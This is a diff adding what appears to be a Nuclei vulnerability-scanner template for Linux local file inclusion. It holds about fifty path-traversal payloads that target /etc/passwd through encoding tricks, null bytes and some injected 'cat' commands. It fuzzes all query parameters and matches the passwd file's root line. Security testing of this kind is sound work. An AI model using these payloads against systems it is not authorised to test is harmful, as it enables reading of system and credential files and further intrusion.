@@ -1,0 +1,80 @@
+id: linux-lfi-fuzz
+
+info:
+  name: Local File Inclusion - Linux
+  author: DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+  tags: lfi,dast,linux
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      nix_fuzz:
+        - '/etc/passwd'
+        - '../../etc/passwd'
+        - '../../../etc/passwd'
+        - '/../../../../etc/passwd'
+        - '../../../../../../../../../etc/passwd'
+        - '../../../../../../../../etc/passwd'
+        - '../../../../../../../etc/passwd'
+        - '../../../../../../etc/passwd'
+        - '../../../../../etc/passwd'
+        - '../../../../etc/passwd'
+        - '../../../etc/passwd'
+        - '../../../etc/passwd%00'
+        - '../../../../../../../../../../../../etc/passwd%00'
+        - '../../../../../../../../../../../../etc/passwd'
+        - '/../../../../../../../../../../etc/passwd^^'
+        - '/../../../../../../../../../../etc/passwd'
+        - '/./././././././././././etc/passwd'
+        - '\..\..\..\..\..\..\..\..\..\..\etc\passwd'
+        - '..\..\..\..\..\..\..\..\..\..\etc\passwd'
+        - '/..\../..\../..\../..\../..\../..\../etc/passwd'
+        - '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd'
+        - '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
+        - '..\..\..\..\..\..\..\..\..\..\etc\passwd%00'
+        - '%252e%252e%252fetc%252fpasswd'
+        - '%252e%252e%252fetc%252fpasswd%00'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
+        - '....//....//etc/passwd'
+        - '..///////..////..//////etc/passwd'
+        - '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
+        - '%0a/bin/cat%20/etc/passwd'
+        - '%00/etc/passwd%00'
+        - '%00../../../../../../etc/passwd'
+        - '/../../../../../../../../../../../etc/passwd%00.jpg'
+        - '/../../../../../../../../../../../etc/passwd%00.html'
+        - '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd'
+        - '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '\\&apos;/bin/cat%20/etc/passwd\\&apos;'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - '{{nix_fuzz}}'
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+# digest: 4b0a00483046022100a1e70a22bc4f17a046a9b366a9015608da82f88439ab75d052b64088a7009da8022100e29c115d86b47951f1da2fb56d7953ec1e59e93d86b70d24d34ad8c14ad3064d:922c64590222798bb761d5b6d8e72950
